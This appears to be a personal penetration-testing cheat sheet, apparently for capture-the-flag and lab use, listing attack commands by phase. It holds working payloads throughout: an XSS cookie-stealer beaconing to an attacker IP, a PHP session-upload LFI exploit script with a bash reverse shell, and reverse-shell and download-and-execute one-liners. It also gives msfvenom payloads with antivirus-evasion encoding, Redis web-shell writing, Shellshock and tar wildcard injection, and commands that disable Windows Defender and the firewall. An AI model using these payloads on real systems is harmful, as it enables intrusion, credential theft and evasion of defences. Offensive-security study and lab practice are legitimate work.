# My Security Resources

[TOC]

## Scan
### Portscan
- nmap
    - Parameters
        - `-A` : Enable OS detection, version detection, script scanning, and traceroute
        - `-p-` : Scan all ports
        - `-p 1000-9999` : Scan port from 1000 to 9999 
- RustScan
	- `rustscan -a 10.10.166.15`
	    - `-r 1-65535` : Port range from 1 to 65535
### Services
- enum4linux
    - Parameters
        - `-a` : Do all simple enumeration
## Web
### Scan
- [Dirsearch](https://github.com/maurosoria/dirsearch)
- [Githack-python3](https://github.com/tigert1998/GitHack-py3)
- [FFUF](https://github.com/ffuf/ffuf)
    - Fuzz sub-domain
        - `ffuf -c -w /usr/share/dnsrecon/subdomains-top1mil-20000.txt -u http://{domain.name}/ -H "Host: FUZZ.{domain.name}" -fs {normal_size}`
### Front-End
#### XSS
- Steal Cookie
	- `<script>new Image().src="http://{my_ip}:1234/"+document.cookie</script>`
	- `nc -l 1234`
### Server
#### Apache
- Default log path
    - `/var/log/apache2/access.log`
- Shell Shock
    - Exist some path like `/cgi-bin/*.sh`
    - Add `() { :;}; echo; /usr/bin/id` to User-Agent
        - Must use Absolute path
#### Nginx
#### IIS
- IIS 6.0
    - [CVE-2017-7269](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269)
        - Can only run once!!
#### Tomcat
- Tomcat Path
    - `/manager/status/all`
    - `/admin/dashboard`
- Path Bypass
    - With `/..;/`
        - e.g. `/manager/status/..;/html/upload`
### PHP
- Bypass `system`
	- `echo passthru("whoami")`
	- `echo shell_exec("whoami")` 
	- `echo exec("whoami")`
- Wrapper
	- `php://filter/convert.base64-encode/resource=meow.php`
- Default Session Path
    - `/var/lib/php/sessions/sess_{sess_name}`
- LFI PHP_SESSION_UPLOAD_PROGRESS (From Splitline)
    ```python
    import grequests
    sess_name = 'meowmeow'
    sess_path = f'/var/lib/php/sessions/sess_{sess_name}'
    base_url = 'http://{target-domain}/{target-path/randylogs.php}'
    param = "file"

    # code = "file_put_contents('/tmp/shell.php','<?php system($_GET[a])');"
    code = '''system("bash -c 'bash -i >& /dev/tcp/{domain}/{port} 0>&1'");'''

    while True:
        req = [grequests.post(base_url,
                              files={'f': "A"*0xffff},
                              data={'PHP_SESSION_UPLOAD_PROGRESS': f"pwned:<?php {code} ?>"},
                              cookies={'PHPSESSID': sess_name}),
               grequests.get(f"{base_url}?{param}={sess_path}")]

        result = grequests.map(req)
        if "pwned" in result[1].text:
            print(result[1].text)
            break
    ```
    - [File extension](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) 
### JSP / Tomcat
- Webshell
    - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp
        - `jar -cvf cmd.war cmd.jsp` and upload to Tomcat admin
### Defence
- Knockd
	- `/etc/knockd.conf`
	- `nc` port several time to knock
### Web Shell
- PHP
	- [b374k](https://github.com/b374k/b374k)
	- [windows-php-reverse-shell](https://github.com/Dhayalanb/windows-php-reverse-shell)
- ASPX
	- https://raw.githubusercontent.com/SecWiki/WebShell-2/master/Aspx/awen%20asp.net%20webshell.aspx
	- https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx
- Adminer (SQLadmin)
    - https://www.adminer.org/
### CMS
#### Wordpress
- WPScan
- Enum user
    - `http://{ip}/index.php/?author=1`
### MySQL injection
#### SQL Command
- Limit
    - `LIMIT 0,1` , `LIMIT 1,1` , `LIMIT 2,1` ...
        - Select only 1 data
- Substring
    - `SUBSTRING("ABC",1,1)`
        - Will return `A`
    - `SUBSTRING("ABC",2,1)`
        - Will return `B`
- ASCII
    - `ASCII("A")`
        - Will Return `65`
- Concat
    - `concat(1,':',2)`
        - Will return `1:2`
#### Dump Data
- DB name
    - `select schema_name from information_schema.schemata`
- Table name
    - `select table_name from information_schema.tables where table_schema='{db_name}'`
- Column name
    - `select column_name from information_schema.columns where table_name='{table_name}' and table_schema='{db_name}'`
- Select data
    - `select concat({username},':',{password}) from {db_name}.{password}`
## Shell
### Linux Shell
- Find File
    - `find  / -iname {file_name} -print 2>/dev/null`
	- `du -a 2>/dev/null | grep {file_name}`
	- `tar cf - $PWD 2>/dev/null | tar tvf - | grep {file_name}`
### Windows Shell
- List all data
	- `dir /a`
### Reverse Shell - Linux
- Prepare
	- `nc -nvlp {port}`
	- `nc -vlk {port}`
	- `rlwrap nc -nvlp`
		- Support left and right
- https://reverse-shell.sh/
- [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- Bash tcp
    - `bash -c 'bash -i >& /dev/tcp/my_ip/7877 0>&1'`
    	- Write file in local first, and use wget/curl to get to victim machine
    	- `/usr/bin/wget -O - {ip:port}/{file} | /bin/bash`
- Make it moreinteractively
    - `python -c 'import pty; pty.spawn("/bin/bash")'`
### Reverse Shell - Windows
- msfvenom
	- https://infinitelogins.com/2020/01/25/sfvenom-reverse-shell-payload-cheatsheet/
	    - stage : `shell/reverse_tcp `
	        - msf `multi/handler` to receive
	    - stageless : `shell_reverse_tcp`
	        - `nc` to receive
	- aspx
		- `msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT}  -f aspx > shell.aspx`
		- `msfvenom -p windows/shell/reverse_tcp LHOST={IP} LPORT={PORT}  -f aspx > shell.aspx`
	- exe
		- `msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f exe > shell-x86.exe`
		- `msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT} -e x86/shikata_ga_nai -f exe > shell.exe`
			- Anti-Anti-virus
        - `msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT}  -f exe -o shellx64.exe`
            - Most of time, x64 system can also run x86 shell
- Powershell
	- https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
	- `powershell iex (New-Object Net.WebClient).DownloadString('http://{my_ip}:{http_port}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {my_ip} -Port {shell_port}`

### File Transmission - Linux
- SCP
- HTTP
	- Prepare
		- `python3 -m http.server`
			- use `sudo` to `get` 80 port
	- GET
		- `wget {my_ip}:{port}/{file_name} -O {path_to_output}`
		- `curl -o {path_to_output} http`
- NC
	- Prepare
		- `nc -l -p {attacker_port} > {file}`
	- Send
		- `nc {attacker_ip} {attacker_port} < {file}`
		- End will not notify
### File Transmission - Windows
- HTTP
	- Prepare
		- `python3 -m http.server`
	- GET (Powershell)
		- `wget` , `curl` , `iwr` is alias for `Invoke-WebRequest`
			- `Invoke-WebRequest http://{my_ip}:{my_port}/{file} -outFile {file_name}`
        - `certutil -urlcache -f {URL} {File_name}`
- SMB
	- `impacket-smbserver meow .`
		- In Kali
	- `copy \\{IP}\meow\{filename} {filename}`
		- In Windows
- Pack file
	- cab
		- `lcab -r {dir} {file.cab}`
			- In kali
		- `expand {file.cab} -F:* {Extract path}`
			- Extract path must be absolute path like `C:\Windows\Temp`
- https://blog.ropnop.com/transferring-files-from-kali-to-windows/
## Server
### Redis
- Write shell / file
	- `redis-cli -h {ip} `
		- Connect
	- `config set dir "/var/www/html"`
		- Set dir
	- `config set dbfilename meow.php`
		- Set file name
	- `set x "\r\n\r\n<?php system($_GET[A]);?>\r\n\r\n"`
		- Write web shell
	- `save`
		- Save file
## MSSQL
- Connect
	- `impacket-mssqlclient -p {port} {UserID}@{IP} -windows-auth`
	- Default port : 1433
- Shell
	- `exec xp_cmdshell '{Command}`
## Privilege - Linux
### Kernel Exploit
- [CVE-2017-16995](https://github.com/rlarabee/exploits/tree/master/cve-2017-16995)
    - Test on Kernel 4.4.0
### Software
- [GTFOBins](https://gtfobins.github.io/)
    - Linux privileges escalation 
- [Pspy](https://github.com/DominicBreuker/pspy)
    - Monitor the process
#### Enumeration
Scan the system to find which can be use for privileges escalation
- [PEASS-ng](https://github.com/carlospolop/PEASS-ng)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [LSE](https://github.com/diego-treitos/linux-smart-enumeration)


### Program Hijack
#### Python
- import library priority
	1. local file
	2. `python -c "import sys;print(sys.path)"`
- Check file permission if it can be write 
- Fake library file
	```python
	import pty
	pty.spawn("/bin/bash")
	```
#### Bash
- Relative path is from `$PATH`
	- We can modify this by
		- `PATH=/my/fake/path:$PATH ./binary`
	- Fake path can contain the shell/reverse shell command fle

### Program
- `tar` Wildcard
	- `echo "{bash -c 'bash -i >& /dev/tcp/my_ip/7877 0>&1'}" > shell.sh`
	- `echo "" > "--checkpoint-action=exec=sh shell.sh"`
	- `echo "" > --checkpoint=1`
	- `tar cf archive.tar *`
### Capability
- If the program has some special capability
	- https://man7.org/linux/man-pages/man7/capabilities.7.html
	- `CAP_SETUID`
- Can do with [GTFOBins](https://gtfobins.github.io/)
###  Doas
- `doas.conf`
	- if exist `permit nopass {user} as {root} cmd {binary}`
	- We can `doas {binary}` and it will run as root
### Docker
- `/.dockerenv`
	- If exist, probably in docker 
- Notice mount point
### SOP
- Check `sudo -l`
	- What file we can run as super user 
- Check crontab
    - `cat /etc/crontab `
	- With LinEnum, LinPeas
	- PsPy check
- Check SUID / SGID
    - `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`
    - `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
    - With [GTFOBins](https://gtfobins.github.io/)
- Check sudo version
	- [CVE-2019-14287](https://www.exploit-db.com/exploits/47502)
		- sudo < 1.8.28
		- `sudo -u#-1 binary`
- Check $PATH / import library permission
	- Program Hijack
- Check capability
    - `getcap -r / 2>/dev/null`
	- Check if the program has some useful capability
- Check backup file
## Privilege - Windows
### Exploit
- https://github.com/SecWiki/windows-kernel-exploits
- [EternalBlue MS17-010](https://github.com/helviojunior/MS17-010)
    - Prepare msf reverse shell exe
    - run `send_and_execute.py` 
        - Maybe need to change username to `guest` 
- [Cerrudo](https://github.com/Re4son/Churrasco)
    - Windows Server 2003
### Bypass UAC
- [CVE-2019-1388](http://blog.leanote.com/post/snowming/38069f423c76)
### Turn off Defender / Firewall
- 64 bit Powershell
	- `%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe`
-  Disable Realtime Monitoring 
	-  `Set-MpPreference -DisableRealtimeMonitoring $true`
-  Uninstall Defender
	-  `Uninstall-WindowsFeature -Name Windows-Defender –whatif`
	-  `Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet`
-  Turn off firewall
	- `Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False`
### Check vulnerability
- [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
	- `systeminfo`
		- Run in target machine and save to txt file
	- `windows-exploit-suggester.py --update`
		- Get new database
	- `windows-exploit-suggester.py --database {Database file} --systeminfo {systeminfofile}`
- [Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng)
	- `systeminfo`
	- `python3 wesng.py --update`
	- `python3 wesng.py {systeminfofile}`
### Sensitive data
- PowerShell History Path
	- `%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt `

## Password Crack
### Software
- Hydra
    - Crack online services password
        - SMB,SSH,FTP......
    - Usage
        - `hydra -l {username} -P {path_to_wordlist} ssh://{ip_address}`
- John the ripper
    - Crack hash like `/etc/shadow`
    - Support tools
        - [ssh2john](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py)
        - gpg2john
        - zip2john
        - samdump2
        	- NTLM 2 John
        	- `samdump2 system sam > j.txt`
    - Usage
        - `john {file} --wordlist={wordlist}`
- Hashcat
    - Crack hash 
        - https://hashcat.net/wiki/doku.php?id=example_hashes
    - `hashcat -m {mode} {hashes.txt} {wordlist.txt}`
### Dictionary
- rockyou.txt
- https://github.com/danielmiessler/SecLists
	- [xato-net-10-million-passwords-dup.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/xato-net-10-million-passwords-dup.txt)
- Apache Tomcat
    - `/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt`
    - `/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt`
### Online
- https://crackstation.net/

## Software
- RDP
	- `xfreerdp +drives /u:{username} /v:{ip}:{port}`
- FTP
	- `ls`
	- `get {file_name}`
	- `put {file_name}`
	- Download recursive 
	    - `wget -r 'ftp://{ip}/{path}/'`
## Forensics
- Unknown files
	- `file {file_name}`
	- `binwalk {file_name}`
	- `xxd {file_name}`

### Steganography
- [stegsolve](https://github.com/zardus/ctf-tools/tree/master/stegsolve)
- [zsteg](https://github.com/zed-0xff/zsteg)
- [steghide](http://steghide.sourceforge.net/)
	- `steghide extract -sf {file_name}`
- exiftool

<!-- todo
chisel
XXE
-->
